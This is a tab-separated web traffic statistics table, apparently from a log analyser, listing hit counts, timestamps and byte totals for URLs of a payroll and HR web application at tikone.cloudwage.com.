1	1	0	0	0	25556455	0	0	25556455	0	0	18431	/payroll-pdf/390
1	2	0	0	0	25409774	0	0	25409774	0	0	36816	/payroll-pdf/400
1	1	0	1	0	24830819	24830821	0	24830819	24830821	0	3564	/payroll/24
1	2	0	0	0	25435708	0	0	25435708	0	0	35514	/payroll-pdf/384
1	29	0	4	0	25671507	24992084	0	24804887	24836702	0	497359	/worked/create
1	2	0	1	0	24849507	24830819	0	24830689	24830819	0	7162	/payroll/23
1	3	0	1	0	24830771	24830819	0	24830686	24830819	0	10693	/payroll/22
1	0	0	1	0	0	24830819	0	0	24830819	0	0	/payroll/21
1	5	0	1	0	24847956	24830688	0	24830688	24830688	0	17953	/payroll/20
1	1	0	1	0	24847954	24830819	0	24847954	24830819	0	3577	/payroll/19
1	1	0	1	0	24847947	24830819	0	24847947	24830819	0	3578	/payroll/18
1	1	0	1	0	24830684	24830819	0	24830684	24830819	0	3570	/payroll/17
1	0	0	1	0	0	24830819	0	0	24830819	0	0	/payroll/16
1	5	0	1	0	24836706	24830686	0	24830680	24830686	0	17905	/payroll/15
1	1	0	1	0	24830673	24830680	0	24830673	24830680	0	3567	/payroll/14
1	2	0	1	0	24938581	24830680	0	24836701	24830680	0	7207	/payroll/13
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/blog/wp-includes/wlwmanifest.xml
1	1	0	1	0	24830675	24830680	0	24830675	24830680	0	3563	/payroll/12
1	9	0	0	0	25588080	0	0	24830918	0	0	75472	/assignments
1	0	0	1	0	0	24830680	0	0	24830680	0	0	/payroll/11
1	1	0	1	0	24830675	24830679	0	24830675	24830679	0	3567	/payroll/10
1	1	0	0	0	25429357	0	0	25429357	0	0	2973	/img/social/facebook.png
1	0	0	2	0	0	25022088	0	0	25022088	0	0	/finalize-payroll?date=2017-06-30
1	1	0	0	0	25259755	0	0	25259755	0	0	17474	/payroll-pdf/366
1	1	0	0	0	24849535	0	0	24849535	0	0	3781	/employee-types/1/edit
1	3	0	0	0	25671503	0	0	24830634	0	0	79841	/contracts/1/edit
1	2	0	0	0	24889665	0	0	24889664	0	0	10610	/contracts/4/edit
1	1	0	0	0	25022184	0	0	25022184	0	0	17531	/payroll-pdf/357
1	112	112	81	1	25966991	25968487	25628882	24745766	24745758	25628882	3331082	/
1	54	0	0	0	25966991	0	0	24745766	0	0	76232	/admin/layout4/scripts/quick-sidebar.js
1	2	0	3	0	24830617	24830633	0	24830617	24830616	0	7435	/payment-methods/1
1	152	0	0	0	25966992	0	0	24745759	0	0	1300050	/admin/layout4/css/layout.css
1	6	0	0	0	25587979	0	0	24938583	0	0	127647	/contracts/7/edit
1	0	0	1	0	0	25543290	0	0	25543290	0	0	/finalize-payroll?date=2018-06-30
1	1	0	0	0	25429357	0	0	25429357	0	0	240	/img/portlet-collapse-icon-white.png
1	1	0	0	0	25429357	0	0	25429357	0	0	256	/img/portlet-expand-icon.png
1	54	0	0	0	25966991	0	0	24804839	0	0	605207	/images/vqqv243h7c1488193138png
1	0	0	0	4	0	0	24836707	0	0	24836688	0	/payroll-pdfs?all=true&sub=2-2017
1	0	0	20	13	0	24888343	24849557	0	24849501	24849513	0	/delete-payroll?date=2017-03-31
1	1	0	0	0	24847905	0	0	24847905	0	0	4024	/employees/10/edit
1	2	0	0	0	24991984	0	0	24938608	0	0	8743	/employees/16/edit
1	1	0	0	0	24898173	0	0	24898173	0	0	3735	/employee-deductions/42/edit
1	2	0	0	0	24992085	0	0	24992084	0	0	8796	/employees/19/edit
1	4	0	1	0	24830918	24830915	0	24804865	24830915	0	14696	/work-plans
1	1	0	0	0	25429357	0	0	25429357	0	0	18028	/plugins/bootstrap/fonts/glyphicons-halflings-regular.woff2
1	5	0	0	0	24836661	0	0	24804712	0	0	27291	/users/create
1	27	0	4	0	25200904	25022123	0	24847917	24847927	0	173314	/loans
1	13	0	0	0	25966991	0	0	24804861	0	0	24037	/plugins/select2/select2-spinner.gif
1	1	0	0	0	25512608	0	0	25512608	0	0	64	/.well-known/pki-validation/EA80282D7A421F4F50A9A7B74AE95324.txt
1	0	0	1	0	0	24804712	0	0	24804712	0	0	/?91.199.212.132
3	2	0	2	0	24991984	24991984	0	24938609	24938609	0	9408	http://tikone.cloudwage.com/employees/16/edit
3	2	0	1	0	24992085	24992084	0	24992084	24992084	0	9495	http://tikone.cloudwage.com/employees/19/edit
3	20	0	1	0	24849679	24836683	0	24836674	24836683	0	81633	http://tikone.cloudwage.com/payroll/0?sub=2-2017
3	1	0	0	0	24859595	0	0	24859595	0	0	17531	http://tikone.cloudwage.com/payroll/204
3	8	0	0	0	24992062	0	0	24804873	0	0	39370	http://tikone.cloudwage.com/grades
3	182	0	9	0	25556459	25501543	0	25459885	25459885	0	2507908	http://tikone.cloudwage.com/payroll/0?sub=5-2018
3	29	0	0	0	25200988	0	0	24847917	0	0	226458	http://tikone.cloudwage.com/loans
3	6	0	1	0	25022187	25022170	0	25022160	25022170	0	26579	http://tikone.cloudwage.com/payroll/0?sub=7-2017&main=Branches
3	163	0	6	0	25634116	25634116	0	25588086	25610960	0	1945918	http://tikone.cloudwage.com/payroll/0?sub=8-2018
3	214	1	115	12	25671508	25671508	24830922	24804886	24804886	24830648	4784243	http://tikone.cloudwage.com/payroll/create
3	17	0	2	0	25561013	25561013	0	24745766	24745766	0	104652	http://tikone.cloudwage.com/user-profile
3	1	0	0	0	25536397	0	0	25536397	0	0	17735	http://tikone.cloudwage.com/payroll-pdf/458
3	2	0	2	0	24938568	24938568	0	24889683	24889683	0	9317	http://tikone.cloudwage.com/payroll/0?sub=4-2017&main=Branches
3	10	0	0	0	25022102	0	0	24804872	0	0	37953	http://tikone.cloudwage.com/payment-structures
3	9	0	0	0	24847955	0	0	24836674	0	0	35941	http://tikone.cloudwage.com/payroll/0?main=Branches&sub=2-2017
3	1	0	0	0	25471591	0	0	25471591	0	0	17735	http://tikone.cloudwage.com/payroll-pdf/455
3	2	0	0	0	25459902	0	0	25459893	0	0	35468	http://tikone.cloudwage.com/payroll-pdf/454
3	2	0	0	0	25588087	0	0	25588087	0	0	57375	http://tikone.cloudwage.com/payroll/487
3	3	0	0	4	24836707	0	24836707	24836688	0	24836688	11949	http://tikone.cloudwage.com/payroll/0?all=true&sub=2-2017
3	1	0	0	0	25459890	0	0	25459890	0	0	19137	http://tikone.cloudwage.com/payroll-pdf/453
3	2	0	2	0	24830863	24830863	0	24804865	24804865	0	8134	http://tikone.cloudwage.com/deductions/create
3	2	0	0	0	25588087	0	0	25588087	0	0	56680	http://tikone.cloudwage.com/payroll/486
3	1	0	0	0	25459886	0	0	25459886	0	0	19137	http://tikone.cloudwage.com/payroll-pdf/452
3	2	0	0	0	25588088	0	0	25588087	0	0	56671	http://tikone.cloudwage.com/payroll/485
3	62	0	0	0	25372306	0	0	24804712	0	0	67620	http://tikone.cloudwage.com/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.css
3	2	0	0	0	25588088	0	0	25588088	0	0	56657	http://tikone.cloudwage.com/payroll/484
3	5	0	5	0	25022120	24849586	0	24849532	24849533	0	18932	http://tikone.cloudwage.com/loans/1/edit
3	10	0	9	0	25671508	25671508	0	24804887	24830649	0	211585	http://tikone.cloudwage.com/policies/6/edit
3	2	0	1	0	24804877	24804877	0	24804874	24804877	0	7504	http://tikone.cloudwage.com/grades/create
3	32	0	0	0	25966991	0	0	24804712	0	0	8060	http://tikone.cloudwage.com/css/plugins.css
3	2	0	0	0	25588087	0	0	25588086	0	0	56661	http://tikone.cloudwage.com/payroll/482
3	2	0	0	0	25588088	0	0	25588088	0	0	55976	http://tikone.cloudwage.com/payroll/481
3	23	0	3	0	24992084	24830633	0	24804866	24830616	0	87339	http://tikone.cloudwage.com/payment-methods
3	2	0	0	0	25588088	0	0	25588088	0	0	55976	http://tikone.cloudwage.com/payroll/480
3	3	0	3	0	25671503	25671503	0	24830634	24830634	0	135269	http://tikone.cloudwage.com/contracts/1/edit
3	2	0	0	0	24850681	0	0	24850681	0	0	23581	http://tikone.cloudwage.com/payroll/165
3	6	0	0	0	24850682	0	0	24849680	0	0	70471	http://tikone.cloudwage.com/payroll/164
3	9	0	0	0	24938584	0	0	24849501	0	0	330987	http://tikone.cloudwage.com/payroll/0?all=true&main=Branches
3	3	0	0	0	24830917	0	0	24804861	0	0	6076	http://tikone.cloudwage.com/departments/1?type=branch
3	24	0	0	0	25588081	0	0	24804874	0	0	164140	http://tikone.cloudwage.com/employee-types
3	2	0	1	0	24889665	24889665	0	24889665	24889665	0	9079	http://tikone.cloudwage.com/contracts/4/edit
3	1761	0	2	0	25966991	24836662	0	24745766	24804836	0	15554523	http://tikone.cloudwage.com/
3	28	0	0	0	24849553	0	0	24849542	0	0	0	http://tikone.cloudwage.com/employee-deductions
3	2	0	1	0	25556482	25556482	0	25556460	25556482	0	25193	http://tikone.cloudwage.com/payroll/472
3	17	0	0	0	25200904	0	0	24847951	0	0	112431	http://tikone.cloudwage.com/loans/03-2017
3	2	0	0	0	24836702	0	0	24836701	0	0	7391	http://tikone.cloudwage.com/worked/03-2017
3	6	0	0	0	25429357	0	0	25429357	0	0	153794	http://tikone.cloudwage.com/plugins/bootstrap/css/bootstrap.min.css
3	6	0	5	0	25587979	25587979	0	24938583	24938583	0	216157	http://tikone.cloudwage.com/contracts/7/edit
3	11	0	11	0	25588079	24836697	0	24836673	24836673	0	75324	http://tikone.cloudwage.com/hours-worked
3	66	0	0	0	25022187	0	0	24836687	0	0	290700	http://tikone.cloudwage.com/payroll/0?main=Branches
3	401	0	3	0	25671506	25610975	0	24804874	25200988	0	5351061	http://tikone.cloudwage.com/contracts
3	11	0	0	0	24992110	0	0	24992012	0	0	43647	http://tikone.cloudwage.com/worked/06-2017
3	6	0	4	0	25543280	25543280	0	24992114	24992114	0	228705	http://tikone.cloudwage.com/contracts/10/edit
3	1	0	0	0	25200904	0	0	25200904	0	0	28449	http://tikone.cloudwage.com/loans/details/4
3	1	0	0	0	25259753	0	0	25259753	0	0	31770	http://tikone.cloudwage.com/employees/21
3	2	0	0	0	25556460	0	0	25556459	0	0	56061	http://tikone.cloudwage.com/payroll/461
3	2	0	0	0	25536397	0	0	25536397	0	0	60061	http://tikone.cloudwage.com/payroll/458
3	26	0	0	0	25966991	0	0	24804860	0	0	29492	http://tikone.cloudwage.com/plugins/select2/select2.css
3	4	0	0	0	24849523	0	0	24847962	0	0	16666	http://tikone.cloudwage.com/loans/details/2
3	5	0	0	0	25200904	0	0	24847955	0	0	44334	http://tikone.cloudwage.com/loans/details/1
3	1	0	1	0	24804873	24804873	0	24804873	24804873	0	3906	http://tikone.cloudwage.com/payment-structures/create
3	23	0	0	0	25610957	0	0	25610957	0	0	236618	http://tikone.cloudwage.com/payroll/457
3	1	0	0	0	24991984	0	0	24991984	0	0	4373	http://tikone.cloudwage.com/employees/16
3	7	0	3	0	25022095	24830634	0	24830612	24830611	0	28657	http://tikone.cloudwage.com/employees/1/edit
3	12	0	0	0	25471591	0	0	25471591	0	0	119423	http://tikone.cloudwage.com/payroll/455
3	2	0	1	0	24849518	24836669	0	24836669	24836669	0	8303	http://tikone.cloudwage.com/employee-types/2/edit
3	3	0	0	0	24992115	0	0	24981931	0	0	82705	http://tikone.cloudwage.com/payroll/0?all=true&sub=6-2017&main=Branches
3	3	0	0	0	24849625	0	0	24849600	0	0	13252	http://tikone.cloudwage.com/employees/14
3	1	0	0	0	25435703	0	0	25435703	0	0	17757	http://tikone.cloudwage.com/payroll-pdf/419
3	8	0	0	0	25459911	0	0	25459893	0	0	152057	http://tikone.cloudwage.com/payroll/454
3	1	0	1	0	24849535	24849535	0	24849535	24849535	0	5520	http://tikone.cloudwage.com/employee-deductions/47/edit
3	4	0	0	0	25459891	0	0	25459890	0	0	111424	http://tikone.cloudwage.com/payroll/453
3	18	0	9	0	24855075	24855074	0	24830582	24830582	0	84133	http://tikone.cloudwage.com/deductions/4
3	4	0	0	0	25459889	0	0	25459886	0	0	96290	http://tikone.cloudwage.com/payroll/452
3	5	0	0	0	24868071	0	0	24830646	0	0	22473	http://tikone.cloudwage.com/deductions/3
3	4	0	1	0	25671503	24938609	0	24938609	24938609	0	138143	http://tikone.cloudwage.com/contracts/16/edit
3	2	0	1	0	24804861	24804861	0	24804860	24804861	0	4739	http://tikone.cloudwage.com/departments/create?type=department
3	1	0	0	0	24868071	0	0	24868071	0	0	3873	http://tikone.cloudwage.com/employees/11
3	1	0	0	0	24992078	0	0	24992078	0	0	4602	http://tikone.cloudwage.com/employees/4/edit
3	1	0	0	0	24849622	0	0	24849622	0	0	4430	http://tikone.cloudwage.com/employees/10
3	1	0	0	0	24830717	0	0	24830717	0	0	3714	http://tikone.cloudwage.com/deductions/2
3	21	0	0	0	25429357	0	0	24804712	0	0	604771	http://tikone.cloudwage.com/plugins/uniform/css/uniform.default.css
3	9	0	0	0	24898173	0	0	24804886	0	0	40607	http://tikone.cloudwage.com/deductions/1
3	5	0	4	0	25022109	25022109	0	24889661	24889661	0	19415	http://tikone.cloudwage.com/advances/create
3	2	0	2	0	25588037	25588037	0	25409564	25409564	0	130908	http://tikone.cloudwage.com/contracts/19/edit
3	1	0	1	0	25409572	25409572	0	25409572	25409572	0	59986	http://tikone.cloudwage.com/contracts/20/edit
3	1	0	0	0	25022105	0	0	25022105	0	0	4601	http://tikone.cloudwage.com/employees/7/edit
3	2	0	0	0	25556459	0	0	25556458	0	0	56677	http://tikone.cloudwage.com/payroll/443
3	1	0	0	0	24830918	0	0	24830918	0	0	3690	http://tikone.cloudwage.com/holidays
3	9	0	4	0	25022168	24992087	0	24992082	24992087	0	33846	http://tikone.cloudwage.com/worked/2017
3	2	0	1	0	24804862	24804862	0	24804861	24804862	0	4764	http://tikone.cloudwage.com/departments/1/edit
3	0	0	0	1	0	0	24849575	0	0	24849575	0	http://tikone.cloudwage.com/employee-deductions/54/edit
3	20	0	0	2	24886809	0	24836688	24836688	0	24836687	214044	http://tikone.cloudwage.com/payroll/0?all=true&sub=3-2017&main=Branches
3	22	0	1	0	25610965	25610965	0	25610965	25610965	0	251991	http://tikone.cloudwage.com/contracts/23/edit
3	22	0	1	0	25475611	25475611	0	25475610	25475611	0	303143	http://tikone.cloudwage.com/contracts/26/edit
3	1	0	0	0	25409774	0	0	25409774	0	0	18408	http://tikone.cloudwage.com/payroll-pdf/400
3	6	0	4	0	24836662	24836662	0	24804713	24804713	0	23954	http://tikone.cloudwage.com/users/create
3	1	0	0	0	24849629	0	0	24849629	0	0	17541	http://tikone.cloudwage.com/payroll/118
3	2	0	0	0	24849627	0	0	24849625	0	0	19885	http://tikone.cloudwage.com/payroll/117
3	1	0	0	0	25022187	0	0	25022187	0	0	65536	http://tikone.cloudwage.com/payroll-pdfs?all=true&sub=7-2017&main=Branches&main=Branches
3	3	0	3	0	24830917	24830917	0	24830647	24830647	0	17937	http://tikone.cloudwage.com/deductions/3/edit
3	1	0	0	0	25435708	0	0	25435708	0	0	17757	http://tikone.cloudwage.com/payroll-pdf/384
3	2	0	0	0	25556458	0	0	25556457	0	0	59791	http://tikone.cloudwage.com/payroll/425
3	5	1	3	0	24938604	24849602	0	24849600	24849600	0	22312	http://tikone.cloudwage.com/employees/14/edit
3	1	0	0	0	24849627	0	0	24849627	0	0	18223	http://tikone.cloudwage.com/payroll/108
3	1	0	1	0	24836702	24836702	0	24836702	24836702	0	3793	http://tikone.cloudwage.com/worked/1/edit
3	2	0	0	0	24830818	0	0	24830715	0	0	8406	http://tikone.cloudwage.com/contracts/1
3	1932	63	105	0	25966992	25966991	0	24745759	24745759	0	18433844	http://tikone.cloudwage.com/login
3	2	0	0	0	25435708	0	0	25435703	0	0	121500	http://tikone.cloudwage.com/payroll/419
3	4	0	2	0	24847885	24836669	0	24804874	24804874	0	15412	http://tikone.cloudwage.com/employee-types/create
3	9	0	0	0	25588081	0	0	24830918	0	0	60012	http://tikone.cloudwage.com/assignments
3	9	0	2	0	25556457	25409778	0	25409764	25409773	0	384924	http://tikone.cloudwage.com/payroll/0?sub=3-2018
3	41	1	7	15	24888392	24888390	24888389	24836689	24849512	24849513	135846	http://tikone.cloudwage.com/payroll/0?sub=3-2017
3	51	0	2	0	25610958	25543290	0	25536397	25543286	0	742804	http://tikone.cloudwage.com/payroll/0?sub=6-2018
3	3	0	1	0	25022166	24992016	0	24992016	24992016	0	12796	http://tikone.cloudwage.com/payroll/0?sub=6-2017
3	7	0	4	0	25022088	25022088	0	24981931	24992111	0	30973	http://tikone.cloudwage.com/payroll/0?sub=6-2017&main=Branches
3	1	0	1	0	25671509	25671509	0	25671509	25671509	0	123632	http://tikone.cloudwage.com/payroll/0?sub=9-2018
3	1	0	1	0	24830633	24830633	0	24830633	24830633	0	4692	http://tikone.cloudwage.com/employee-payment-methods/1/edit
3	4	0	1	0	25412421	25409786	0	25409786	25409786	0	206770	http://tikone.cloudwage.com/employees/27/edit
3	4	0	1	0	25022109	25022109	0	24889666	25022109	0	16769	http://tikone.cloudwage.com/advances/04-2017
3	2	0	0	0	25556457	0	0	25556455	0	0	59162	http://tikone.cloudwage.com/payroll/390
3	2	0	0	0	25409774	0	0	25409774	0	0	63943	http://tikone.cloudwage.com/payroll/400
3	2	0	0	0	24849559	0	0	24849558	0	0	21997	http://tikone.cloudwage.com/payroll/64
3	2	0	2	0	25022123	25022123	0	24992081	24992081	0	7585	http://tikone.cloudwage.com/advances/07-2017
3	2	0	1	0	25435737	25435737	0	25435708	25435737	0	24519	http://tikone.cloudwage.com/payroll/384
3	41	0	16	2	24888343	24888343	24888362	24836687	24847935	24888362	159431	http://tikone.cloudwage.com/payroll/0?sub=3-2017&main=Branches
3	2	0	7	9	25913629	25913630	25913632	25913627	25913626	25720783	12792	http://www.google.com.hk/
3	10	0	0	3	24855079	0	24836692	24836689	0	24836689	177477	http://tikone.cloudwage.com/payroll/0?all=true&sub=3-2017
3	2	0	2	0	24849587	24849587	0	24849523	24849523	0	7581	http://tikone.cloudwage.com/loans/2/edit
3	154	2	6	0	25412431	25412427	0	24804874	24830621	0	1917247	http://tikone.cloudwage.com/employees
3	1	0	1	0	24836698	24836698	0	24836698	24836698	0	4528	http://tikone.cloudwage.com/policies/7/edit
3	45	0	0	0	25459889	0	0	24804862	0	0	351105	http://tikone.cloudwage.com/allowances
3	6	0	1	0	24992084	24804894	0	24804865	24804894	0	21185	http://tikone.cloudwage.com/shifts
3	2	0	0	0	24938592	0	0	24938591	0	0	8914	http://tikone.cloudwage.com/employees/5
3	2	0	0	0	24849524	0	0	24849524	0	0	22806	http://tikone.cloudwage.com/payroll/50
3	1	0	0	0	24830617	0	0	24830617	0	0	3891	http://tikone.cloudwage.com/contracts/2/edit
3	2	0	0	0	24830632	0	0	24830632	0	0	8285	http://tikone.cloudwage.com/employees/4
3	123	0	0	0	25671509	0	0	24836707	0	0	1625090	http://tikone.cloudwage.com/payroll-report
3	6	0	0	0	24836705	0	0	24830633	0	0	25657	http://tikone.cloudwage.com/employees/1
3	3	0	0	0	25022102	0	0	24847885	0	0	12151	http://tikone.cloudwage.com/employee-types/1
3	4	0	2	0	24992015	24992015	0	24847917	24847917	0	17563	http://tikone.cloudwage.com/contracts/5/edit
3	2	0	0	0	25259755	0	0	25259755	0	0	48431	http://tikone.cloudwage.com/payroll/366
3	34	0	0	0	25671508	0	0	24804839	0	0	540011	http://tikone.cloudwage.com/policies
3	2	0	0	0	24849522	0	0	24849521	0	0	24186	http://tikone.cloudwage.com/payroll/41
3	11	0	0	2	24981928	0	24830670	24830650	0	24830650	308796	http://tikone.cloudwage.com/payroll/0?all=true
3	5	0	0	0	25412427	0	0	25412419	0	0	219467	http://tikone.cloudwage.com/worked/04-2018
3	2	0	0	0	24889683	0	0	24889663	0	0	7974	http://tikone.cloudwage.com/worked/04-2017
3	23	0	8	0	25543280	25543280	0	24830687	24830687	0	302184	http://tikone.cloudwage.com/contracts/8/edit
3	3	0	0	0	24830617	0	0	24830616	0	0	11178	http://tikone.cloudwage.com/payment-methods/1/edit
3	2	0	0	0	25200903	0	0	25022123	0	0	37686	http://tikone.cloudwage.com/loans/07-2017
3	2	0	0	0	25022185	0	0	25022184	0	0	22227	http://tikone.cloudwage.com/payroll/357
3	0	0	0	1	0	0	24898348	0	0	24898348	0	http://tikone.cloudwage.com/employee-deductions/42/edit
3	18	3	4	0	25022184	24992088	0	24992084	24992085	0	61074	http://tikone.cloudwage.com/worked/07-2017
3	2	0	0	0	24849519	0	0	24849512	0	0	23549	http://tikone.cloudwage.com/payroll/32
3	2	0	2	0	25409565	25409565	0	25022108	25022108	0	64816	http://tikone.cloudwage.com/contracts/11/edit
3	1	0	0	0	24830821	0	0	24830821	0	0	17515	http://tikone.cloudwage.com/payroll/31
3	4	0	2	0	25459892	25459892	0	25409567	25409567	0	152952	http://tikone.cloudwage.com/contracts/14/edit
3	1	0	1	0	24830635	24830635	0	24830635	24830635	0	4708	http://tikone.cloudwage.com/employee-deductions/create?deduction=4
3	2	0	0	0	24830820	0	0	24830819	0	0	21687	http://tikone.cloudwage.com/payroll/24
3	3	0	0	0	24849510	0	0	24830689	0	0	40616	http://tikone.cloudwage.com/payroll/23
3	5	1	0	0	24830771	0	0	24830686	0	0	59309	http://tikone.cloudwage.com/payroll/22
3	3	0	0	0	24938599	0	0	24938588	0	0	51969	http://tikone.cloudwage.com/payroll/0?all=true&sub=5-2017&main=Branches
3	22	0	2	0	25610967	25610967	0	25409566	25409566	0	306534	http://tikone.cloudwage.com/contracts/17/edit
3	2	0	0	0	24847962	0	0	24847954	0	0	23341	http://tikone.cloudwage.com/payroll/19
3	2	0	0	0	25409561	0	0	24938591	0	0	54537	http://tikone.cloudwage.com/employees/5/edit
3	6	0	0	0	24847956	0	0	24830688	0	0	69670	http://tikone.cloudwage.com/payroll/20
3	2	0	0	0	24847950	0	0	24847947	0	0	22662	http://tikone.cloudwage.com/payroll/18
3	2	0	0	0	24830684	0	0	24830684	0	0	20939	http://tikone.cloudwage.com/payroll/17
3	16	0	6	0	25561030	25561030	0	24804712	24830927	0	68722	http://tikone.cloudwage.com/users
3	3	0	2	0	25455884	25455884	0	25409572	25409572	0	190400	http://tikone.cloudwage.com/contracts/21/edit
3	6	1	4	0	25022123	25022123	0	24847927	24847927	0	22767	http://tikone.cloudwage.com/loans/create
3	8	0	0	0	24836706	0	0	24830680	0	0	87561	http://tikone.cloudwage.com/payroll/15
3	5	0	3	0	24991992	24991992	0	24938571	24938576	0	22996	http://tikone.cloudwage.com/employees/8/edit
3	2	0	0	0	24830674	0	0	24830674	0	0	21919	http://tikone.cloudwage.com/payroll/14
3	4	0	0	0	24938581	0	0	24836701	0	0	44855	http://tikone.cloudwage.com/payroll/13
3	2	0	0	0	24830675	0	0	24830675	0	0	21917	http://tikone.cloudwage.com/payroll/12
3	6	1	0	0	25409576	0	0	24847886	0	0	129551	http://tikone.cloudwage.com/contracts/create
3	2	0	0	0	24830676	0	0	24830675	0	0	21643	http://tikone.cloudwage.com/payroll/10
3	1	0	0	1	24836701	0	24836701	24836701	0	24836701	4121	http://tikone.cloudwage.com/payroll/0?all=true&sub=2-2017&main=Branches
3	44	0	1	0	25610962	25610962	0	25610957	25610962	0	564931	http://tikone.cloudwage.com/contracts/24/edit
3	44	0	0	0	25966991	0	0	24745766	0	0	2244569	http://tikone.cloudwage.com/plugins/simple-line-icons/simple-line-icons.min.css
3	5	0	4	0	25409557	25409557	0	24806006	24806006	0	49140	http://tikone.cloudwage.com/deductions/1/edit
3	4	0	3	0	25412426	25412426	0	25412418	25412418	0	283749	http://tikone.cloudwage.com/contracts/27/edit
3	8	1	3	0	25459884	25459884	0	24804863	24804863	0	93194	http://tikone.cloudwage.com/allowances/create
3	1	0	1	0	24830915	24830915	0	24830915	24830915	0	3918	http://tikone.cloudwage.com/shifts/create
3	1	0	1	0	24830919	24830919	0	24830919	24830919	0	3939	http://tikone.cloudwage.com/grades/1/edit
3	1	0	0	0	24849533	0	0	24849533	0	0	4435	http://tikone.cloudwage.com/employees/12/edit
3	7	0	4	0	24889666	24889666	0	24830685	24830685	0	33692	http://tikone.cloudwage.com/deductions/4/edit
3	3	0	0	0	24888389	0	0	24888362	0	0	222910	http://tikone.cloudwage.com/finalize-payroll?date=2017-03-31
3	49	0	0	0	25966992	0	0	24745759	0	0	2794074	http://tikone.cloudwage.com/plugins/font-awesome/css/font-awesome.min.css
3	1	0	1	0	24836702	24836702	0	24836702	24836702	0	3793	http://tikone.cloudwage.com/worked/2/edit
3	1	0	0	0	24992062	0	0	24992062	0	0	4053	http://tikone.cloudwage.com/assignments/19/edit
3	2	0	1	0	25259755	25259755	0	25259755	25259755	0	105112	http://tikone.cloudwage.com/payroll/0?sub=1-2018
3	39	0	30	0	25412431	25412431	0	24804876	24804883	0	685042	http://tikone.cloudwage.com/employees/create
3	7	0	2	0	25556458	25455883	0	25412422	25412427	0	383290	http://tikone.cloudwage.com/payroll/0?sub=4-2018
3	7	0	0	0	24849555	0	0	24849516	0	0	0	http://tikone.cloudwage.com/delete-payroll?date=2017-03-31
3	155	0	8	1	25610960	25610960	25610959	25556460	25610958	25610959	1557499	http://tikone.cloudwage.com/payroll/0?sub=7-2018
3	3	0	0	0	25259746	0	0	25022166	0	0	67345	http://tikone.cloudwage.com/payroll/0?sub=7-2017
3	3	0	0	0	24938598	0	0	24938597	0	0	0	http://tikone.cloudwage.com/employee-allowances
3	1	0	0	0	24992062	0	0	24992062	0	0	3759	http://tikone.cloudwage.com/payment-structures/1/edit
3	6	0	4	0	24981928	24981928	0	24938586	24938586	0	26128	http://tikone.cloudwage.com/payroll/0?sub=5-2017&main=Branches
3	2	0	1	0	24804860	24804860	0	24804860	24804860	0	4638	http://tikone.cloudwage.com/departments/create
3	1	0	1	0	24889664	24889664	0	24889664	24889664	0	3819	http://tikone.cloudwage.com/worked/15/edit
3	1	0	0	0	25543287	0	0	25543287	0	0	17739	http://tikone.cloudwage.com/payroll-pdf/246
3	4	0	1	0	25459884	25459884	0	25459884	25459884	0	58784	http://tikone.cloudwage.com/employee-allowances/create?allowanceId=22
3	1	0	1	0	24889681	24889681	0	24889681	24889681	0	4355	http://tikone.cloudwage.com/employee-allowances/create?allowanceId=21
3	2	0	1	0	24849511	24849511	0	24849511	24849511	0	8867	http://tikone.cloudwage.com/policies/5/edit
3	2	0	0	0	24847913	0	0	24836696	0	0	7928	http://tikone.cloudwage.com/payroll/0?sub=2-2017&main=Branches
3	4	0	0	0	24830918	0	0	24804866	0	0	15324	http://tikone.cloudwage.com/work-plans
3	108	0	4	0	25671507	24992084	0	24804887	24836702	0	1150758	http://tikone.cloudwage.com/worked
3	65	0	0	0	25966991	0	0	24836683	0	0	778390	http://tikone.cloudwage.com/tax?type=p9
3	0	0	1	0	0	25920048	0	0	25920048	0	0	http://www.tikone.cloudwage.com/
3	1	0	0	0	24830617	0	0	24830617	0	0	3698	http://tikone.cloudwage.com/contracts/3/edit
3	29	1	16	0	25671507	25634118	0	24804887	24804887	0	367955	http://tikone.cloudwage.com/worked/create
3	1	0	0	0	25543285	0	0	25543285	0	0	17739	http://tikone.cloudwage.com/payroll-pdf/226
3	3	0	1	4	25459889	25459889	24938597	25459889	25459889	24938597	56559	http://tikone.cloudwage.com/employee-allowances/1/edit
3	520	1	28	0	25671509	25259759	0	24804886	24830648	0	5814126	http://tikone.cloudwage.com/payroll
3	75	0	0	0	25966992	0	0	24745759	0	0	291680	http://tikone.cloudwage.com/css/components-rounded.css
3	5	0	0	0	24830677	0	0	24830673	0	0	46558	http://tikone.cloudwage.com/payroll/9
3	5	0	0	0	24938614	0	0	24938608	0	0	20973	http://tikone.cloudwage.com/worked/05-2017
3	1	0	1	0	25022107	25022107	0	25022107	25022107	0	4830	http://tikone.cloudwage.com/contracts/9/edit
3	2	0	0	0	24847963	0	0	24847932	0	0	8511	http://tikone.cloudwage.com/loans/2017
3	7	0	1	0	24836687	24804890	0	24804888	24804890	0	91296	http://tikone.cloudwage.com/payroll/1
3	1	0	1	0	24830915	24830915	0	24830915	24830915	0	3916	http://tikone.cloudwage.com/work-plans/create
3	4	0	0	0	25022187	0	0	25022170	0	0	120567	http://tikone.cloudwage.com/payroll/0?all=true&sub=7-2017&main=Branches
3	1	0	0	0	24849534	0	0	24849534	0	0	3886	http://tikone.cloudwage.com/contracts/12/edit
3	4	0	1	0	24938593	24889685	0	24889685	24889685	0	18188	http://tikone.cloudwage.com/allowances/21/edit
3	16	0	0	0	24992062	0	0	24804839	0	0	33903	http://tikone.cloudwage.com/departments
3	4	0	4	0	24836697	24836697	0	24836697	24836697	0	14713	http://tikone.cloudwage.com/units-made
3	1	0	0	0	24849535	0	0	24849535	0	0	3767	http://tikone.cloudwage.com/employee-types/1/edit
3	2	0	0	0	25543287	0	0	25543287	0	0	135343	http://tikone.cloudwage.com/payroll/246
3	14	0	0	0	25459889	0	0	25459884	0	0	400426	http://tikone.cloudwage.com/allowances/22
3	4	0	2	0	25459892	25459892	0	25409569	25409569	0	152952	http://tikone.cloudwage.com/contracts/15/edit
3	177	3	8	0	25671512	25671512	0	24836708	25412442	0	2601473	http://tikone.cloudwage.com/payroll-generate
3	14	0	2	0	24939006	24939006	0	24889681	24938598	0	44598	http://tikone.cloudwage.com/allowances/21
3	56	0	0	0	25409557	0	0	24804839	0	0	382858	http://tikone.cloudwage.com/deductions
3	2	0	0	0	24830617	0	0	24830617	0	0	8591	http://tikone.cloudwage.com/payment-methods/1
3	26	0	2	0	25610962	25610962	0	25409568	25409568	0	484535	http://tikone.cloudwage.com/contracts/18/edit
3	0	0	0	15	0	0	24849545	0	0	24849542	0	http://tikone.cloudwage.com/employee-deductions/53/edit
